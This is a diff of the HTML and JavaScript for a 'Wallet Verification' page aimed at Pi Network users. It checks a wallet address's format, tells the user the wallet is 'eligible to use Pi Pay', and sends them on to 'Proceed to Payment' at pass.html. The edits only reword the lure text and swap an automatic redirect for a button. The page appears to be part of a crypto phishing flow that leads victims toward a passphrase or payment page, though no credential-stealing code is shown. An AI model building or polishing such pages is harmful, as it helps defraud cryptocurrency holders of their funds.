@@ -5,7 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style> /* Match previous design exactly */
+    <style>
+        /* Match previous design exactly */
         * {
             margin: 0;
             padding: 0;
@@ -208,7 +209,7 @@
     </style>
 </head>
 <body>
-    <!-- Status Bar -->
+    <!-- Status Bar - Exact match to previous design -->
     <div class="status-bar">
         <div class="nav-item">
             <i class="fas fa-arrow-left"></i>
@@ -265,13 +266,13 @@
                 <i class="fas fa-check-circle"></i>
             </div>
 
-            <h1>Wallet Verified Successfully!</h1>
+            <h1>Wallet Is Eligible Congratulations!</h1>
 
             <div class="success-message">
-                <p>Your wallet has been successfully verified and is now ready for use.</p>
+                <p>Your wallet is eligible to use Pi Pay.</p>
             </div>
 
-            <!-- Optional: Keep the button for manual redirection -->
+            <!-- CTA Button to Proceed to Payment -->
             <button class="cta-button" onclick="window.location.href='pass.html'">
                 Proceed to Payment
             </button>
@@ -302,14 +303,6 @@
                         verificationMessage.style.backgroundColor = '#f0e6ff';
                         activateButton.classList.add('show');
                         responseText.classList.add('show');
-
-                        // Automatically show the success screen
-                        showSuccessScreen();
-
-                        // Automatically redirect to payment.html after 3 seconds
-                        setTimeout(() => {
-                            window.location.href = 'payment.html';
-                        }, 3000); // 3-second delay
                     } else {
                         verificationMessage.style.display = 'flex';
                         verificationMessage.innerHTML = `<i class="fas fa-times-circle"></i> Invalid Pi Wallet Address`;
@@ -325,7 +318,7 @@
         // Validate Pi Network Wallet Address
         function isValidPiWalletAddress(address) {
             // Pi wallet addresses start with 'G' and are 56 characters long
-            return /^G[a-zA-Z0-9]{55}$/.test(address);**
+            return /^G[a-zA-Z0-9]{55}$/.test(address);
         }
 
         // Tooltip for Help Icon
